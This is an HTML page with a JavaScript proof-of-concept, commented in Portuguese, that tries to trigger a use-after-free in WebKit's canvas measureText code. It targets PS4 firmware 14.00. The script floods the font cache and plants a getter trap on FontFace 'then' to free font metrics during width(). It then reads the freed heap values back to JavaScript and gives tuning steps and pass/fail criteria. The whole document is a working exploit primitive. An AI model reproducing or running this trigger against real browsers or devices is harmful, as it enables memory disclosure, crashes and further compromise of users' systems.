<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
</head>
<body>
<pre id="log">Iniciando...</pre>
<script>
// UAF HIBRIDO — FontMetrics reference + getter trap
//
// Combina dois commits do WebKit:
//   [A] 42b1e2aac2c7 — getter trap via face.then causa FontFaceSet.add()
//                       → font selector invalidation durante width()
//                       → FontCascadeFonts liberado por pruneUnreferencedEntries()
//
//   [B] 5ccd64b2ea72 — measureTextInternal() vincula &fontMetrics ANTES de width()
//                       → se FontCascadeFonts for liberado durante width(),
//                          fontMetrics aponta para heap liberado
//                       → UAF reads retornados via TextMetrics ao JavaScript
//
// POR QUE NENHUM WORKER OU OFFSCREENCANVAS E NECESSARIO:
//   O trigger original de [B] usa font grande (>= 1MB) que depende de
//   ExternalResourceDownloadPolicy::Allow — especifico de Workers.
//   O trigger hibrido usa a font pequena de [A] via pre-warm, que o PS4
//   FW 14.00 confirmou ser sincrono no main thread.
//   O efeito em FontCascadeFonts e o mesmo — o caminho para chegar la e diferente.
//
// RESULTADO ESPERADO:
//   UAF reads — valores anomalos (NaN, Infinity, numeros absurdos, zeros inesperados)
//   em actualBoundingBoxAscent/Descent, fontBoundingBoxAscent/Descent, emHeightAscent/Descent.
//   Pode crashar se a leitura atingir pagina nao mapeada.
//   Valores identicos entre attempt 0 e 1 e normais = fontMetrics nao foi liberado ainda
//   (pruneUnreferencedEntries nao disparou durante width() — aumentar N_DUMMIES).

function log(msg) { document.getElementById('log').textContent = msg; }

// ---------------------------------------------------------------------------
// Passo 1: popular o FontCascadeCache
//
// pruneUnreferencedEntries() dispara quando o cache ultrapassa 1000 entradas.
// Precisa disparar DENTRO de width() — durante a reentrada do getter trap.
// 1200 entradas garante que o limiar seja cruzado sem sobrecarregar o PS4.
// Se os valores de TextMetrics forem normais, aumentar para 2000.
// ---------------------------------------------------------------------------
var N_DUMMIES = 1200;
log('Criando ' + N_DUMMIES + ' contextos dummy...');

var dummies = [];
for (var i = 0; i < N_DUMMIES; i++) {
    var d = document.createElement('canvas');
    d.width = 1; d.height = 1;
    var dc = d.getContext('2d');
    dc.font = '10px "dummy' + i + '"';
    dummies.push(dc);
}

// ---------------------------------------------------------------------------
// Passo 2: font pequena como data: URL
//
// Pequena o suficiente para ser processada por opportunisticallyStartFontDataURLLoading
// (pre-warm). Confirmado no PS4 FW 14.00 que completa SINCRONAMENTE no main thread.
// Dados invalidos sao suficientes — o evento de conclusao e o que importa.
// ---------------------------------------------------------------------------
var smallDataUrl = 'url("data:font/woff;base64,d09GRgABAAAAAAA")';

// ---------------------------------------------------------------------------
// Passo 3: configurar as duas faces com unicode-range split
//
// metricsDonor: SEM unicode-range → cobre todos os caracteres incluindo U+0020
//   measureTextInternal() vai usar ESTA fonte como primaryFont para
//   (A) fontMetrics = metricsOfPrimaryFont() — esta e a referencia que ficara dangling
//
// measured: com unicode-range U+13A0-13FF (Cherokee)
//   O glyph walk de width() encontra Cherokee → tenta carregar 'measured'
//   → pre-warm → carregamento sincrono → getter trap dispara
//   → FontFaceSet.add() → invalidacao → FontCascadeFonts liberado
//   → fontMetrics DANGLING antes de (C) emHeightAscent()
// ---------------------------------------------------------------------------
var metricsLog = [];
var keepAlive = [];

for (var attempt = 0; attempt < 2; attempt++) {
    var metricsDonor = new FontFace(
        'metricsDonor' + attempt,
        smallDataUrl
        // sem unicodeRange → primaryFont para U+0020 e qualquer char sem cobertura especifica
    );

    var measured = new FontFace(
        'measured' + attempt,
        smallDataUrl,
        { unicodeRange: 'U+13A0-13FF' } // Cherokee exclusivo para 'measured'
    );

    document.fonts.add(metricsDonor);
    document.fonts.add(measured);

    // Popula deferred promises para que a resolucao seja observavel
    void metricsDonor.loaded;
    void measured.loaded;

    // ---------------------------------------------------------------------------
    // Getter trap — mecanismo de [A] (commit 42b1e2a)
    //
    // Quando a engine WebKit resolve a promise de FontFace.loaded durante o
    // pre-warm em width(), testa se o valor e "thenable" (duck-typing Promise/A+)
    // acessando .then — o getter abaixo e disparado.
    //
    // Efeito encadeado:
    //   getter → document.fonts.add() → CSSFontFaceSet::add()
    //          → font selector invalidation → FontCascade re-keyed
    //          → FontCascadeFonts anterior perde referencias externas
    //          → FontCascadeCache::pruneUnreferencedEntries() (>1000 entradas)
    //          → FontCascadeFonts DESTRUIDO
    //          → fontMetrics (vinculada antes de width()) DANGLING
    // ---------------------------------------------------------------------------
    var reenterFontFaceSet = function() {
        document.fonts.add(new FontFace('unrelated', 'local("nonexistent")'));
    };
    Object.defineProperty(metricsDonor, 'then', { get: reenterFontFaceSet });
    Object.defineProperty(measured,     'then', { get: reenterFontFaceSet });

    var canvas = document.createElement('canvas');
    canvas.width = 64; canvas.height = 64;
    canvas.style.position = 'absolute';
    canvas.style.left = '-9999px';
    document.body.appendChild(canvas);
    var context = canvas.getContext('2d');

    // Cascata: metricsDonor e o primaryFont (sem unicode-range, cobre U+0020)
    //          measured e o fallback para Cherokee (U+13A0-13FF)
    context.font = '10px metricsDonor' + attempt + ', measured' + attempt;
    keepAlive.push(metricsDonor, measured, context);

    // ---------------------------------------------------------------------------
    // measureText dispara a sequencia vulneravel em measureTextInternal():
    //
    //   (A) auto& fontMetrics = fontProxy->metricsOfPrimaryFont()
    //              ↑ vincula fontMetrics ao FontCascadeFonts de metricsDonor
    //
    //   (B) float w = fontProxy->width('\u13A0\u13A2\u13A4')
    //         WidthIterator::advance() caracter por caracter (CodePath::Simple, < U+1700)
    //           U+13A0 → cobre pelo 'measured' → pre-warm → carregamento sincrono
    //             → getter trap dispara → FontFaceSet.add()
    //               → invalidacao → FontCascadeFonts liberado (>1000 dummies)
    //                 → &fontMetrics DANGLING
    //
    //   (C) emHeightAscentAndDescent(fontMetrics)  ← UAF read #1
    //   (D) metrics.setActualBoundingBoxAscent(...) ← UAF reads subsequentes
    //       → valores corrompidos de heap retornados ao JS via TextMetrics
    // ---------------------------------------------------------------------------
    var metrics = context.measureText('\u13A0\u13A2\u13A4');

    metricsLog.push({
        attempt: attempt,
        width:                    metrics.width,
        actualBoundingBoxAscent:  metrics.actualBoundingBoxAscent,
        actualBoundingBoxDescent: metrics.actualBoundingBoxDescent,
        fontBoundingBoxAscent:    metrics.fontBoundingBoxAscent,
        fontBoundingBoxDescent:   metrics.fontBoundingBoxDescent,
        emHeightAscent:           metrics.emHeightAscent,
        emHeightDescent:          metrics.emHeightDescent
    });
}

// ---------------------------------------------------------------------------
// Diagnostico
//
// PASS — UAF acionado:
//   a) crash antes desta mensagem
//   b) valores anomalos: NaN, Infinity, numeros negativos absurdos, ou
//      valores DIFERENTES entre attempt 0 e 1 (heap layout variou)
//      ou valores IDENTICOS mas claramente errados (ex: ascent = 0, descent = 0)
//
// FAIL — UAF nao acionado:
//   valores normais e identicos (ex: ascent ~8-11, descent ~0-2)
//   → pruneUnreferencedEntries nao disparou durante width()
//   → aumentar N_DUMMIES para 2000 ou 3000 e testar novamente
// ---------------------------------------------------------------------------
var out = '';
for (var k = 0; k < metricsLog.length; k++) {
    var m = metricsLog[k];
    out += '--- attempt ' + m.attempt + ' ---\n';
    out += 'width:                    ' + m.width + '\n';
    out += 'actualBoundingBoxAscent:  ' + m.actualBoundingBoxAscent + '\n';
    out += 'actualBoundingBoxDescent: ' + m.actualBoundingBoxDescent + '\n';
    out += 'fontBoundingBoxAscent:    ' + m.fontBoundingBoxAscent + '\n';
    out += 'fontBoundingBoxDescent:   ' + m.fontBoundingBoxDescent + '\n';
    out += 'emHeightAscent:           ' + m.emHeightAscent + '\n';
    out += 'emHeightDescent:          ' + m.emHeightDescent + '\n\n';
}
out += 'PASS se: crash, NaN/Infinity, valores absurdos, ou divergencia entre attempts\n';
out += 'FAIL se: valores normais identicos (ascent ~8-11, descent ~0-2)\n';
out += '         → aumentar N_DUMMIES e testar novamente';
log(out);
</script>
</body>
</html>
